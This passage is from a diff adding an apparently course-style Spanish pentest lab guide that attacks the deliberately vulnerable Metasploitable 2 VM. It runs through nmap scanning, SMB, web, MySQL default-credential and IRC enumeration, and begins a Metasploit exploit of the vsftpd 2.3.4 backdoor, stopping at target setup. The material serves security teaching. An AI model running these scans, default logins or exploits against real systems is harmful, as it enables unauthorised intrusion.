+<span id="cb43-90"><a href="#cb43-90" aria-hidden="true" tabindex="-1"></a><span class="in">1099/tcp  open   rmiregistry</span></span>
+<span id="cb43-91"><a href="#cb43-91" aria-hidden="true" tabindex="-1"></a><span class="in">1524/tcp  open   ingreslock</span></span>
+<span id="cb43-92"><a href="#cb43-92" aria-hidden="true" tabindex="-1"></a><span class="in">2049/tcp  open   nfs</span></span>
+<span id="cb43-93"><a href="#cb43-93" aria-hidden="true" tabindex="-1"></a><span class="in">2121/tcp  open   ccproxy-ftp</span></span>
+<span id="cb43-94"><a href="#cb43-94" aria-hidden="true" tabindex="-1"></a><span class="in">3306/tcp  open   mysql</span></span>
+<span id="cb43-95"><a href="#cb43-95" aria-hidden="true" tabindex="-1"></a><span class="in">5432/tcp  open   postgresql</span></span>
+<span id="cb43-96"><a href="#cb43-96" aria-hidden="true" tabindex="-1"></a><span class="in">5900/tcp  open   vnc</span></span>
+<span id="cb43-97"><a href="#cb43-97" aria-hidden="true" tabindex="-1"></a><span class="in">6000/tcp  open   X11</span></span>
+<span id="cb43-98"><a href="#cb43-98" aria-hidden="true" tabindex="-1"></a><span class="in">6667/tcp  open   irc</span></span>
+<span id="cb43-99"><a href="#cb43-99" aria-hidden="true" tabindex="-1"></a><span class="in">8009/tcp  open   ajp13</span></span>
+<span id="cb43-100"><a href="#cb43-100" aria-hidden="true" tabindex="-1"></a><span class="in">8180/tcp  open   unknown</span></span>
+<span id="cb43-101"><a href="#cb43-101" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-102"><a href="#cb43-102" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-103"><a href="#cb43-103" aria-hidden="true" tabindex="-1"></a><span class="at">&gt; **Nota**: Metasploitable 2 expone intencionalmente docenas de servicios vulnerables. Esta superficie de ataque enorme es ideal para practicar múltiples vectores.</span></span>
+<span id="cb43-104"><a href="#cb43-104" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-105"><a href="#cb43-105" aria-hidden="true" tabindex="-1"></a><span class="fu">### 1.3 Detección de SO y Versiones</span></span>
+<span id="cb43-106"><a href="#cb43-106" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-107"><a href="#cb43-107" aria-hidden="true" tabindex="-1"></a><span class="in">```bash</span></span>
+<span id="cb43-108"><a href="#cb43-108" aria-hidden="true" tabindex="-1"></a><span class="co"># Detección completa: OS, versiones de servicios, scripts por defecto</span></span>
+<span id="cb43-109"><a href="#cb43-109" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span> <span class="at">-sS</span> <span class="at">-sV</span> <span class="at">-sC</span> <span class="at">-O</span> <span class="at">-p</span> 21,22,23,25,80,139,445,3306,5432,6667,8180 <span class="va">$TARGET</span> <span class="at">-oN</span> fase1_servicios.txt</span>
+<span id="cb43-110"><a href="#cb43-110" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-111"><a href="#cb43-111" aria-hidden="true" tabindex="-1"></a><span class="co"># Detección de OS solamente</span></span>
+<span id="cb43-112"><a href="#cb43-112" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span> <span class="at">-O</span> <span class="va">$TARGET</span> <span class="kw">|</span> <span class="fu">grep</span> <span class="st">"OS details"</span></span>
+<span id="cb43-113"><a href="#cb43-113" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-114"><a href="#cb43-114" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-115"><a href="#cb43-115" aria-hidden="true" tabindex="-1"></a>**Output esperado (extracto)**:</span>
+<span id="cb43-116"><a href="#cb43-116" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-117"><a href="#cb43-117" aria-hidden="true" tabindex="-1"></a><span class="in">21/tcp  open  ftp     vsftpd 2.3.4</span></span>
+<span id="cb43-118"><a href="#cb43-118" aria-hidden="true" tabindex="-1"></a><span class="in">22/tcp  open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)</span></span>
+<span id="cb43-119"><a href="#cb43-119" aria-hidden="true" tabindex="-1"></a><span class="in">80/tcp  open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2)</span></span>
+<span id="cb43-120"><a href="#cb43-120" aria-hidden="true" tabindex="-1"></a><span class="in">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span></span>
+<span id="cb43-121"><a href="#cb43-121" aria-hidden="true" tabindex="-1"></a><span class="in">445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian</span></span>
+<span id="cb43-122"><a href="#cb43-122" aria-hidden="true" tabindex="-1"></a><span class="in">3306/tcp open  mysql   MySQL 5.0.51a-3ubuntu5</span></span>
+<span id="cb43-123"><a href="#cb43-123" aria-hidden="true" tabindex="-1"></a><span class="in">6667/tcp open  irc     UnrealIRCd</span></span>
+<span id="cb43-124"><a href="#cb43-124" aria-hidden="true" tabindex="-1"></a><span class="in">8180/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1</span></span>
+<span id="cb43-125"><a href="#cb43-125" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-126"><a href="#cb43-126" aria-hidden="true" tabindex="-1"></a><span class="in">OS details: Linux 2.6.9 - 2.6.33</span></span>
+<span id="cb43-127"><a href="#cb43-127" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-128"><a href="#cb43-128" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-129"><a href="#cb43-129" aria-hidden="true" tabindex="-1"></a>**Entregable Fase 1**: Archivo <span class="in">`fase1_puertos.txt`</span> con todos los puertos abiertos y versiones de servicio identificadas.</span>
+<span id="cb43-130"><a href="#cb43-130" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-131"><a href="#cb43-131" aria-hidden="true" tabindex="-1"></a>---</span>
+<span id="cb43-132"><a href="#cb43-132" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-133"><a href="#cb43-133" aria-hidden="true" tabindex="-1"></a><span class="fu">## Fase 2: Escaneo y Enumeración</span></span>
+<span id="cb43-134"><a href="#cb43-134" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-135"><a href="#cb43-135" aria-hidden="true" tabindex="-1"></a>**Objetivo**: Profundizar en cada servicio para identificar vulnerabilidades específicas, usuarios, recursos compartidos y rutas web.</span>
+<span id="cb43-136"><a href="#cb43-136" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-137"><a href="#cb43-137" aria-hidden="true" tabindex="-1"></a><span class="fu">### 2.1 Scripts de Vulnerabilidad con Nmap</span></span>
+<span id="cb43-138"><a href="#cb43-138" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-139"><a href="#cb43-139" aria-hidden="true" tabindex="-1"></a><span class="in">```bash</span></span>
+<span id="cb43-140"><a href="#cb43-140" aria-hidden="true" tabindex="-1"></a><span class="co"># Ejecutar scripts NSE de vulnerabilidad</span></span>
+<span id="cb43-141"><a href="#cb43-141" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span> <span class="at">--script</span> vuln <span class="va">$TARGET</span> <span class="at">-p</span> 21,80,139,445,3306 <span class="at">-oN</span> fase2_vulns.txt</span>
+<span id="cb43-142"><a href="#cb43-142" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-143"><a href="#cb43-143" aria-hidden="true" tabindex="-1"></a><span class="co"># Scripts específicos por servicio</span></span>
+<span id="cb43-144"><a href="#cb43-144" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span> <span class="at">--script</span> ftp-vsftpd-backdoor <span class="va">$TARGET</span> <span class="at">-p</span> 21</span>
+<span id="cb43-145"><a href="#cb43-145" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span> <span class="at">--script</span> smb-vuln-ms08-067 <span class="va">$TARGET</span> <span class="at">-p</span> 445</span>
+<span id="cb43-146"><a href="#cb43-146" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span> <span class="at">--script</span> http-shellshock <span class="va">$TARGET</span> <span class="at">-p</span> 80</span>
+<span id="cb43-147"><a href="#cb43-147" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-148"><a href="#cb43-148" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-149"><a href="#cb43-149" aria-hidden="true" tabindex="-1"></a>**Output esperado (vsftpd)**:</span>
+<span id="cb43-150"><a href="#cb43-150" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-151"><a href="#cb43-151" aria-hidden="true" tabindex="-1"></a><span class="in">21/tcp open  ftp</span></span>
+<span id="cb43-152"><a href="#cb43-152" aria-hidden="true" tabindex="-1"></a><span class="in">| ftp-vsftpd-backdoor: </span></span>
+<span id="cb43-153"><a href="#cb43-153" aria-hidden="true" tabindex="-1"></a><span class="in">|   VULNERABLE:</span></span>
+<span id="cb43-154"><a href="#cb43-154" aria-hidden="true" tabindex="-1"></a><span class="in">|   vsFTPd version 2.3.4 backdoor</span></span>
+<span id="cb43-155"><a href="#cb43-155" aria-hidden="true" tabindex="-1"></a><span class="in">|     State: VULNERABLE (Exploitable)</span></span>
+<span id="cb43-156"><a href="#cb43-156" aria-hidden="true" tabindex="-1"></a><span class="in">|     CVE: CVE-2011-2523</span></span>
+<span id="cb43-157"><a href="#cb43-157" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-158"><a href="#cb43-158" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-159"><a href="#cb43-159" aria-hidden="true" tabindex="-1"></a><span class="fu">### 2.2 Enumeración SMB</span></span>
+<span id="cb43-160"><a href="#cb43-160" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-161"><a href="#cb43-161" aria-hidden="true" tabindex="-1"></a><span class="in">```bash</span></span>
+<span id="cb43-162"><a href="#cb43-162" aria-hidden="true" tabindex="-1"></a><span class="co"># Enumeración completa de Samba</span></span>
+<span id="cb43-163"><a href="#cb43-163" aria-hidden="true" tabindex="-1"></a><span class="ex">enum4linux</span> <span class="at">-a</span> <span class="va">$TARGET</span> <span class="kw">|</span> <span class="fu">tee</span> fase2_smb.txt</span>
+<span id="cb43-164"><a href="#cb43-164" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-165"><a href="#cb43-165" aria-hidden="true" tabindex="-1"></a><span class="co"># Ver recursos compartidos</span></span>
+<span id="cb43-166"><a href="#cb43-166" aria-hidden="true" tabindex="-1"></a><span class="ex">smbclient</span> <span class="at">-L</span> //<span class="va">$TARGET</span> <span class="at">-N</span></span>
+<span id="cb43-167"><a href="#cb43-167" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-168"><a href="#cb43-168" aria-hidden="true" tabindex="-1"></a><span class="co"># Acceder a recurso tmp</span></span>
+<span id="cb43-169"><a href="#cb43-169" aria-hidden="true" tabindex="-1"></a><span class="ex">smbclient</span> //<span class="va">$TARGET</span>/tmp <span class="at">-N</span></span>
+<span id="cb43-170"><a href="#cb43-170" aria-hidden="true" tabindex="-1"></a><span class="ex">smb:</span> <span class="dt">\&gt;</span> ls</span>
+<span id="cb43-171"><a href="#cb43-171" aria-hidden="true" tabindex="-1"></a><span class="ex">smb:</span> <span class="dt">\&gt;</span> exit</span>
+<span id="cb43-172"><a href="#cb43-172" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-173"><a href="#cb43-173" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-174"><a href="#cb43-174" aria-hidden="true" tabindex="-1"></a>**Output esperado (enum4linux extracto)**:</span>
+<span id="cb43-175"><a href="#cb43-175" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-176"><a href="#cb43-176" aria-hidden="true" tabindex="-1"></a><span class="in">[+] Got OS info for 192.168.56.102 from smbclient: </span></span>
+<span id="cb43-177"><a href="#cb43-177" aria-hidden="true" tabindex="-1"></a><span class="in">Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.20-Debian]</span></span>
+<span id="cb43-178"><a href="#cb43-178" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-179"><a href="#cb43-179" aria-hidden="true" tabindex="-1"></a><span class="in">[+] Users on 192.168.56.102:</span></span>
+<span id="cb43-180"><a href="#cb43-180" aria-hidden="true" tabindex="-1"></a><span class="in">user:[msfadmin] rid:[1000]</span></span>
+<span id="cb43-181"><a href="#cb43-181" aria-hidden="true" tabindex="-1"></a><span class="in">user:[postgres] rid:[1001]</span></span>
+<span id="cb43-182"><a href="#cb43-182" aria-hidden="true" tabindex="-1"></a><span class="in">user:[service] rid:[1003]</span></span>
+<span id="cb43-183"><a href="#cb43-183" aria-hidden="true" tabindex="-1"></a><span class="in">user:[user] rid:[1004]</span></span>
+<span id="cb43-184"><a href="#cb43-184" aria-hidden="true" tabindex="-1"></a><span class="in">user:[www-data] rid:[33]</span></span>
+<span id="cb43-185"><a href="#cb43-185" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-186"><a href="#cb43-186" aria-hidden="true" tabindex="-1"></a><span class="in">Share Enumeration:</span></span>
+<span id="cb43-187"><a href="#cb43-187" aria-hidden="true" tabindex="-1"></a><span class="in">        Sharename       Type      Comment</span></span>
+<span id="cb43-188"><a href="#cb43-188" aria-hidden="true" tabindex="-1"></a><span class="in">        ---------       ----      -------</span></span>
+<span id="cb43-189"><a href="#cb43-189" aria-hidden="true" tabindex="-1"></a><span class="in">        print$          Disk      Printer Drivers</span></span>
+<span id="cb43-190"><a href="#cb43-190" aria-hidden="true" tabindex="-1"></a><span class="in">        tmp             Disk      oh noes!</span></span>
+<span id="cb43-191"><a href="#cb43-191" aria-hidden="true" tabindex="-1"></a><span class="in">        opt             Disk      </span></span>
+<span id="cb43-192"><a href="#cb43-192" aria-hidden="true" tabindex="-1"></a><span class="in">        IPC$            IPC       IPC Service</span></span>
+<span id="cb43-193"><a href="#cb43-193" aria-hidden="true" tabindex="-1"></a><span class="in">        ADMIN$          IPC       IPC Service</span></span>
+<span id="cb43-194"><a href="#cb43-194" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-195"><a href="#cb43-195" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-196"><a href="#cb43-196" aria-hidden="true" tabindex="-1"></a><span class="fu">### 2.3 Enumeración Web — Puerto 80</span></span>
+<span id="cb43-197"><a href="#cb43-197" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-198"><a href="#cb43-198" aria-hidden="true" tabindex="-1"></a><span class="in">```bash</span></span>
+<span id="cb43-199"><a href="#cb43-199" aria-hidden="true" tabindex="-1"></a><span class="co"># Escáner web completo con nikto</span></span>
+<span id="cb43-200"><a href="#cb43-200" aria-hidden="true" tabindex="-1"></a><span class="ex">nikto</span> <span class="at">-h</span> http://<span class="va">$TARGET</span> <span class="at">-o</span> fase2_nikto.txt</span>
+<span id="cb43-201"><a href="#cb43-201" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-202"><a href="#cb43-202" aria-hidden="true" tabindex="-1"></a><span class="co"># Enumeración de directorios</span></span>
+<span id="cb43-203"><a href="#cb43-203" aria-hidden="true" tabindex="-1"></a><span class="ex">dirb</span> http://<span class="va">$TARGET</span> /usr/share/wordlists/dirb/common.txt <span class="at">-o</span> fase2_dirb.txt</span>
+<span id="cb43-204"><a href="#cb43-204" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-205"><a href="#cb43-205" aria-hidden="true" tabindex="-1"></a><span class="co"># Alternativa con gobuster (más rápido)</span></span>
+<span id="cb43-206"><a href="#cb43-206" aria-hidden="true" tabindex="-1"></a><span class="ex">gobuster</span> dir <span class="at">-u</span> http://<span class="va">$TARGET</span> <span class="at">-w</span> /usr/share/wordlists/dirb/common.txt <span class="at">-o</span> fase2_gobuster.txt</span>
+<span id="cb43-207"><a href="#cb43-207" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-208"><a href="#cb43-208" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-209"><a href="#cb43-209" aria-hidden="true" tabindex="-1"></a>**Output esperado (nikto extracto)**:</span>
+<span id="cb43-210"><a href="#cb43-210" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-211"><a href="#cb43-211" aria-hidden="true" tabindex="-1"></a><span class="in">+ Server: Apache/2.2.8 (Ubuntu) DAV/2</span></span>
+<span id="cb43-212"><a href="#cb43-212" aria-hidden="true" tabindex="-1"></a><span class="in">+ The anti-clickjacking X-Frame-Options header is not present.</span></span>
+<span id="cb43-213"><a href="#cb43-213" aria-hidden="true" tabindex="-1"></a><span class="in">+ /phpinfo.php: Output from the phpinfo() function was found.</span></span>
+<span id="cb43-214"><a href="#cb43-214" aria-hidden="true" tabindex="-1"></a><span class="in">+ /phpMyAdmin/: phpMyAdmin directory found</span></span>
+<span id="cb43-215"><a href="#cb43-215" aria-hidden="true" tabindex="-1"></a><span class="in">+ OSVDB-3268: /doc/: Directory indexing found.</span></span>
+<span id="cb43-216"><a href="#cb43-216" aria-hidden="true" tabindex="-1"></a><span class="in">+ /twiki/: A TWiki installation was found at this directory.</span></span>
+<span id="cb43-217"><a href="#cb43-217" aria-hidden="true" tabindex="-1"></a><span class="in">+ OSVDB-3233: /phpinfo.php: Contains PHP configuration information</span></span>
+<span id="cb43-218"><a href="#cb43-218" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-219"><a href="#cb43-219" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-220"><a href="#cb43-220" aria-hidden="true" tabindex="-1"></a>**Output esperado (dirb extracto)**:</span>
+<span id="cb43-221"><a href="#cb43-221" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-222"><a href="#cb43-222" aria-hidden="true" tabindex="-1"></a><span class="in">---- Scanning URL: http://192.168.56.102/ ----</span></span>
+<span id="cb43-223"><a href="#cb43-223" aria-hidden="true" tabindex="-1"></a><span class="in">==&gt; DIRECTORY: http://192.168.56.102/dav/</span></span>
+<span id="cb43-224"><a href="#cb43-224" aria-hidden="true" tabindex="-1"></a><span class="in">==&gt; DIRECTORY: http://192.168.56.102/dvwa/</span></span>
+<span id="cb43-225"><a href="#cb43-225" aria-hidden="true" tabindex="-1"></a><span class="in">==&gt; DIRECTORY: http://192.168.56.102/mutillidae/</span></span>
+<span id="cb43-226"><a href="#cb43-226" aria-hidden="true" tabindex="-1"></a><span class="in">==&gt; DIRECTORY: http://192.168.56.102/phpmyadmin/</span></span>
+<span id="cb43-227"><a href="#cb43-227" aria-hidden="true" tabindex="-1"></a><span class="in">==&gt; DIRECTORY: http://192.168.56.102/tikiwiki/</span></span>
+<span id="cb43-228"><a href="#cb43-228" aria-hidden="true" tabindex="-1"></a><span class="in">+ http://192.168.56.102/phpinfo.php (CODE:200|SIZE:48168)</span></span>
+<span id="cb43-229"><a href="#cb43-229" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-230"><a href="#cb43-230" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-231"><a href="#cb43-231" aria-hidden="true" tabindex="-1"></a><span class="fu">### 2.4 Enumeración de Base de Datos</span></span>
+<span id="cb43-232"><a href="#cb43-232" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-233"><a href="#cb43-233" aria-hidden="true" tabindex="-1"></a><span class="in">```bash</span></span>
+<span id="cb43-234"><a href="#cb43-234" aria-hidden="true" tabindex="-1"></a><span class="co"># MySQL — probar credenciales por defecto</span></span>
+<span id="cb43-235"><a href="#cb43-235" aria-hidden="true" tabindex="-1"></a><span class="ex">mysql</span> <span class="at">-h</span> <span class="va">$TARGET</span> <span class="at">-u</span> root <span class="at">-p</span></span>
+<span id="cb43-236"><a href="#cb43-236" aria-hidden="true" tabindex="-1"></a><span class="co"># Contraseña: (vacía — solo presionar Enter)</span></span>
+<span id="cb43-237"><a href="#cb43-237" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-238"><a href="#cb43-238" aria-hidden="true" tabindex="-1"></a><span class="co"># Si accede:</span></span>
+<span id="cb43-239"><a href="#cb43-239" aria-hidden="true" tabindex="-1"></a><span class="ex">mysql</span><span class="op">&gt;</span> show databases<span class="kw">;</span></span>
+<span id="cb43-240"><a href="#cb43-240" aria-hidden="true" tabindex="-1"></a><span class="ex">mysql</span><span class="op">&gt;</span> use dvwa<span class="kw">;</span></span>
+<span id="cb43-241"><a href="#cb43-241" aria-hidden="true" tabindex="-1"></a><span class="ex">mysql</span><span class="op">&gt;</span> show tables<span class="kw">;</span></span>
+<span id="cb43-242"><a href="#cb43-242" aria-hidden="true" tabindex="-1"></a><span class="ex">mysql</span><span class="op">&gt;</span> exit<span class="kw">;</span></span>
+<span id="cb43-243"><a href="#cb43-243" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-244"><a href="#cb43-244" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-245"><a href="#cb43-245" aria-hidden="true" tabindex="-1"></a>**Output esperado**:</span>
+<span id="cb43-246"><a href="#cb43-246" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-247"><a href="#cb43-247" aria-hidden="true" tabindex="-1"></a><span class="in">Welcome to the MySQL monitor. Commands end with ; or \g.</span></span>
+<span id="cb43-248"><a href="#cb43-248" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-249"><a href="#cb43-249" aria-hidden="true" tabindex="-1"></a><span class="in">mysql&gt; show databases;</span></span>
+<span id="cb43-250"><a href="#cb43-250" aria-hidden="true" tabindex="-1"></a><span class="in">+--------------------+</span></span>
+<span id="cb43-251"><a href="#cb43-251" aria-hidden="true" tabindex="-1"></a><span class="in">| Database           |</span></span>
+<span id="cb43-252"><a href="#cb43-252" aria-hidden="true" tabindex="-1"></a><span class="in">+--------------------+</span></span>
+<span id="cb43-253"><a href="#cb43-253" aria-hidden="true" tabindex="-1"></a><span class="in">| information_schema |</span></span>
+<span id="cb43-254"><a href="#cb43-254" aria-hidden="true" tabindex="-1"></a><span class="in">| dvwa               |</span></span>
+<span id="cb43-255"><a href="#cb43-255" aria-hidden="true" tabindex="-1"></a><span class="in">| metasploit         |</span></span>
+<span id="cb43-256"><a href="#cb43-256" aria-hidden="true" tabindex="-1"></a><span class="in">| mysql              |</span></span>
+<span id="cb43-257"><a href="#cb43-257" aria-hidden="true" tabindex="-1"></a><span class="in">| owasp10            |</span></span>
+<span id="cb43-258"><a href="#cb43-258" aria-hidden="true" tabindex="-1"></a><span class="in">| tikiwiki           |</span></span>
+<span id="cb43-259"><a href="#cb43-259" aria-hidden="true" tabindex="-1"></a><span class="in">| tikiwiki195        |</span></span>
+<span id="cb43-260"><a href="#cb43-260" aria-hidden="true" tabindex="-1"></a><span class="in">+--------------------+</span></span>
+<span id="cb43-261"><a href="#cb43-261" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-262"><a href="#cb43-262" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-263"><a href="#cb43-263" aria-hidden="true" tabindex="-1"></a><span class="fu">### 2.5 Enumeración de IRC (UnrealIRCd)</span></span>
+<span id="cb43-264"><a href="#cb43-264" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-265"><a href="#cb43-265" aria-hidden="true" tabindex="-1"></a><span class="in">```bash</span></span>
+<span id="cb43-266"><a href="#cb43-266" aria-hidden="true" tabindex="-1"></a><span class="co"># Verificar versión de UnrealIRCd</span></span>
+<span id="cb43-267"><a href="#cb43-267" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-nv</span> <span class="va">$TARGET</span> 6667</span>
+<span id="cb43-268"><a href="#cb43-268" aria-hidden="true" tabindex="-1"></a><span class="co"># Escribir: VERSION</span></span>
+<span id="cb43-269"><a href="#cb43-269" aria-hidden="true" tabindex="-1"></a><span class="co"># Esperar respuesta y presionar Ctrl+C</span></span>
+<span id="cb43-270"><a href="#cb43-270" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-271"><a href="#cb43-271" aria-hidden="true" tabindex="-1"></a><span class="co"># Con nmap script</span></span>
+<span id="cb43-272"><a href="#cb43-272" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span> <span class="at">--script</span> irc-info <span class="va">$TARGET</span> <span class="at">-p</span> 6667</span>
+<span id="cb43-273"><a href="#cb43-273" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-274"><a href="#cb43-274" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-275"><a href="#cb43-275" aria-hidden="true" tabindex="-1"></a>**Output esperado**:</span>
+<span id="cb43-276"><a href="#cb43-276" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-277"><a href="#cb43-277" aria-hidden="true" tabindex="-1"></a><span class="in">:irc.Metasploitable.LAN 351 * UnrealIRCd-3.2.8.1. irc.Metasploitable.LAN :FhinIoO</span></span>
+<span id="cb43-278"><a href="#cb43-278" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-279"><a href="#cb43-279" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-280"><a href="#cb43-280" aria-hidden="true" tabindex="-1"></a>**Entregable Fase 2**: Archivos <span class="in">`fase2_smb.txt`</span>, <span class="in">`fase2_nikto.txt`</span>, <span class="in">`fase2_dirb.txt`</span> con listado de usuarios, recursos compartidos, directorios web y versiones de servicios vulnerables.</span>
+<span id="cb43-281"><a href="#cb43-281" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-282"><a href="#cb43-282" aria-hidden="true" tabindex="-1"></a>---</span>
+<span id="cb43-283"><a href="#cb43-283" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-284"><a href="#cb43-284" aria-hidden="true" tabindex="-1"></a><span class="fu">## Fase 3: Explotación</span></span>
+<span id="cb43-285"><a href="#cb43-285" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-286"><a href="#cb43-286" aria-hidden="true" tabindex="-1"></a>**Objetivo**: Obtener acceso al sistema mediante al menos tres vectores de ataque diferentes.</span>
+<span id="cb43-287"><a href="#cb43-287" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-288"><a href="#cb43-288" aria-hidden="true" tabindex="-1"></a><span class="at">&gt; **Importante**: Documentar cada explotación con capturas de pantalla o salida de terminal guardada en archivo.</span></span>
+<span id="cb43-289"><a href="#cb43-289" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-290"><a href="#cb43-290" aria-hidden="true" tabindex="-1"></a><span class="fu">### 3.1 Vector 1 — vsftpd 2.3.4 Backdoor (CVE-2011-2523)</span></span>
+<span id="cb43-291"><a href="#cb43-291" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-292"><a href="#cb43-292" aria-hidden="true" tabindex="-1"></a>**Descripción**: vsftpd 2.3.4 fue comprometido en su repositorio oficial en 2011. Cuando el usuario de FTP contiene <span class="in">`:)`</span> (smiley), el daemon abre una shell de root en el puerto 6200.</span>
+<span id="cb43-293"><a href="#cb43-293" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-294"><a href="#cb43-294" aria-hidden="true" tabindex="-1"></a>**CVSS v3**: 9.8 (Crítico) | **CWE**: CWE-78 (OS Command Injection)</span>
+<span id="cb43-295"><a href="#cb43-295" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-296"><a href="#cb43-296" aria-hidden="true" tabindex="-1"></a><span class="in">```bash</span></span>
+<span id="cb43-297"><a href="#cb43-297" aria-hidden="true" tabindex="-1"></a><span class="co"># Iniciar Metasploit</span></span>
+<span id="cb43-298"><a href="#cb43-298" aria-hidden="true" tabindex="-1"></a><span class="ex">msfconsole</span> <span class="at">-q</span></span>
+<span id="cb43-299"><a href="#cb43-299" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-300"><a href="#cb43-300" aria-hidden="true" tabindex="-1"></a><span class="co"># Buscar el módulo</span></span>
+<span id="cb43-301"><a href="#cb43-301" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> search vsftpd</span>
+<span id="cb43-302"><a href="#cb43-302" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-303"><a href="#cb43-303" aria-hidden="true" tabindex="-1"></a><span class="co"># Seleccionar el exploit</span></span>
+<span id="cb43-304"><a href="#cb43-304" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> use exploit/unix/ftp/vsftpd_234_backdoor</span>
+<span id="cb43-305"><a href="#cb43-305" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-306"><a href="#cb43-306" aria-hidden="true" tabindex="-1"></a><span class="co"># Ver opciones requeridas</span></span>
+<span id="cb43-307"><a href="#cb43-307" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span> exploit<span class="er">(</span><span class="ex">unix/ftp/vsftpd_234_backdoor</span><span class="kw">)</span><span class="op">&gt;</span> show <span class="ex">options</span></span>
+<span id="cb43-308"><a href="#cb43-308" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-309"><a href="#cb43-309" aria-hidden="true" tabindex="-1"></a><span class="co"># Configurar objetivo</span></span>
+<span id="cb43-310"><a href="#cb43-310" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span> exploit<span class="er">(</span><span class="ex">unix/ftp/vsftpd_234_backdoor</span><span class="kw">)</span><span class="op">&gt;</span> set <span class="ex">RHOSTS</span> 192.168.56.102</span>
